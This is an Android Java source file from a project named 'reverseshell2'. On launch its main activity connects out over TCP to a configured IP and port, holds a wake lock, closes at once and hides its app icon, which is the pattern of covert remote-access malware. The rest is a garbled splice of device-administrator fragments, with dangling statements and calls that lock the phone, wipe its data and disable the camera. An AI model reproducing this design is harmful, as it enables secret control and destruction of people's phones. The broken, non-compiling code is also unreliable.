package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;
import android.app.admin.DeviceAdminReceiver;

public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;

    @Override
   protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context=getApplicationContext();
        Log.d(TAG,config.IP+"\t"+config.port);
        final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK,TAG);
        mWakeLock.acquire();
        new tcpConnection(activity,context).execute(config.IP,config.port);
        finish();
        overridePendingTransition(0, 0);
        new functions(activity).hideAppIcon(context);
        new 
         @Override
   public boolean onPreferenceChange(Preference preference, Object newValue) {
        if (super.onPreferenceChange(preference, newValue)) {
            return true;
        }
        boolean value = (Boolean) newValue;
        if (preference == enableCheckbox) {
            if (value != adminActive) {
                if (value) {
                    // Launch the activity to have the user enable our admin.
              Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminSample);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            activity.getString(R.string.add_admin_extra_app_text));
                    startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
              // return false - don't update checkbox until we're really active
                    return false;
                } else {
                    dpm.removeActiveAdmin(deviceAdminSample);
                    enableDeviceCapabilitiesArea(false);
                    adminActive = false;
                }
            }
        } else if (preference == disableCameraCheckbox) {
            dpm.setCameraDisabled(deviceAdminSample, value);
            new  
            
        DevicePolicyManager dpm;
    ...
    private boolean isActiveAdmin() {
        return dpm.isAdminActive(deviceAdminSample);
        new
       DevicePolicyManager dpm =
        (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
    new
    DevicePolicyManager dpm;
    mDPM.lockNow();
        }
        return true;
    }
    DevicePolicyManager dpm;
    mDPM.wipeData(0);
    new
    private CheckBoxPreference disableCameraCheckbox;
    DevicePolicyManager dpm;
    ComponentName deviceAdminSample;
    ...
    dpm.setCameraDisabled(deviceAdminSample, mDisableCameraCheckbox.isChecked());
    new
    DevicePolicyManager dpm;
    ComponentName deviceAdminSample;
    ...
    dpm.setStorageEncryption(deviceAdminSample, true);
    }
}
